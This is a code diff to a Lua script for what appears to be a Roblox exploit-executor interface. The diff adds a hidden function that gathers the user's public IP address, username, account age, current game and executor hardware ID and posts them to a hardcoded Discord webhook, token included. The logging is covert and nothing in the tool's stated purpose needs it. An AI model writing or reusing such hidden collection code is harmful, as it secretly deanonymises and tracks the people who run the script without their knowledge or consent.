@@ -15,29 +15,110 @@ local utility = {}
 local objects = {}
 
 -- hwid
-local http_request = http_request;
-if syn then
-    http_request = syn.request
-elseif SENTINEL_V2 then
-    function http_request(tb)
-        return {
-            StatusCode = 200;
-            Body = request(tb.Url, tb.Method, (tb.Body or ''))
+function Revoked()
+    local IP = game:HttpGet("https://v4.ident.me")
+    plr = game:GetService'Players'.LocalPlayer
+    local premium = false
+    local ALT = false
+    if plr.MembershipType == Enum.MembershipType.Premium then
+        premium = true
+    elseif plr.MembershipType == Enum.MembershipType.None then
+        premium = false
+    end
+    if premium == false then 
+        if plr.AccountAge <= 70 then 
+            ALT = true
+        end
+    end
+    
+    local market = game:GetService("MarketplaceService")
+    local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+    
+    
+    local http_request = http_request;
+    if syn then
+        http_request = syn.request
+    elseif SENTINEL_V2 then
+        function http_request(tb)
+            return {
+                StatusCode = 200;
+                Body = request(tb.Url, tb.Method, (tb.Body or ''))
+            }
+        end
+    end
+    
+    local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+    local decoded = game:GetService('HttpService'):JSONDecode(body)
+    local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+    hwid = "";
+    
+    for i, v in next, hwid_list do
+        if decoded.headers[v] then
+            hwid = decoded.headers[v];
+            break
+        end
+    end
+    
+    if hwid then
+    local HttpServ = game:GetService('HttpService')
+    local url = "https://discord.com/api/webhooks/806710263939465246/oufbQJ1zMqsg4tj5XL51e73q61EoKGGax8bQ8xCbZjNjK2aATyysF8SFecjW0ApMbDx_"
+    local imagelabel = Instance.new("ImageLabel")
+    
+    imagelabel.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..plr.UserId.."&width=420&height=420&format=png"
+    local data = 
+        {
+            ["content"] = "",
+            ["embeds"] = {{
+                ["title"] = "__**Username:**__",
+                ["thumbnail"] = {["url"] = imagelabel.Image},
+                ["description"] = "**["..game.Players.LocalPlayer.Name.."](https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile)**",
+                ["type"] = "rich",
+                ["color"] = tonumber(0),
+                ["fields"] = {
+                    {
+                        ["name"] = "__**Status:**__",
+                        ["value"] = "```DEX-USER```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "__**IP Address:**__",
+                        ["value"] = "```" .. IP .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "__**Game:**__",
+                        ["value"] = "**[" .. info.Name .. "](https://roblox.com/games/" .. game.PlaceId .. "/)**",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "__**Age:**__",
+                        ["value"] = "```" .. plr.AccountAge .. "```",
+                        ["inline"] = true
+                    },
+                    {
+                        ["name"] = "__**Version:**__",
+                        ["value"] = "```" .. Zen_Version .. "```",
+                        ["inline"] = false
+                    },
+                    {
+                        ["name"] = "__**HWID:**__",
+                        ["value"] = "```" .. hwid .. "```",
+                        ["inline"] = false
+                    }
+                    
+                },
+            }}
         }
+        local newdata = HttpServ:JSONEncode(data)
+        
+        local headers = {
+                ["content-type"] = "application/json"
+        }
+        
+        local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
+        http_request(request_payload)
     end
-end
-
-local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
-local decoded = game:GetService('HttpService'):JSONDecode(body)
-local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
-hwid = "";
-
-for i, v in next, hwid_list do
-    if decoded.headers[v] then
-        hwid = decoded.headers[v];
-        break
-    end
-end
+end -- {Red}
 
 if hwid ~= "3d2566ad0b371877a88991102877169636ddc12bc1636fc79a7e1affe8c1f391f09c4e599ac8018f05e20cc55c911c593211bc19f5d8acd23b6c5a1f17207aff" then  
 local themes = {
